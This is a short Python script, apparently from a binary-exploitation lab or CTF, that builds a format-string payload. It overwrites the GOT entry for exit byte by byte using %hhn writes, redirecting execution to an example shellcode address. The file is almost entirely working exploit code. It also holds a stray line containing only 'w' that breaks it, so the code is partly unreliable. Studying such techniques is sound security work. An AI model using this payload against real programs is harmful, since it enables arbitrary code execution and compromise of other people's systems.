#!/usr/bin/env python
import struct

# 1. Target Locations
# We need 4 addresses, pointing to each byte of the GOT entry
# If exit is at 0x080497e0:

exit = 0x080497e0

addr0 = struct.pack("<I", exit )      # Points to byte 0
addr1 = struct.pack("<I", exit + 1)  # Points to byte 1
addr2 = struct.pack("<I", exit + 2)  # Points to byte 2
addr3 = struct.pack("<I", exit + 3)  # Points to byte 3

# 2. Construct Payload
# Total header length = 16 bytes (4 addresses * 4 bytes)
payload = ""
payload += addr0  # Offset 10
payload += addr1  # Offset 11
payload += addr2  # Offset 12
payload += addr3  # Offset 13
w
# shellcode address to write (example: 0xffffd860)
# --- Write 1: 0x60 (96) ---
# Current: 16 -> Goal: 96 -> Pad: 80

payload += "%80x"
payload += "%10$hhn"

# --- Write 2: 0xd8 (216) ---
# Current: 96 -> Goal: 216 -> Pad: 120

payload += "%120x"
payload += "%11$hhn"

# --- Write 3: 0xff (255) ---
# Current: 216 -> Goal: 255 -> Pad: 39
payload += "%39x"
payload += "%12$hhn"

# --- Write 4: 0xff (255) ---
# Current: 255 -> Goal: 255 -> Pad: 0
# No padding needed, just write immediately to the next address
payload += "%13$hhn"

print(payload)
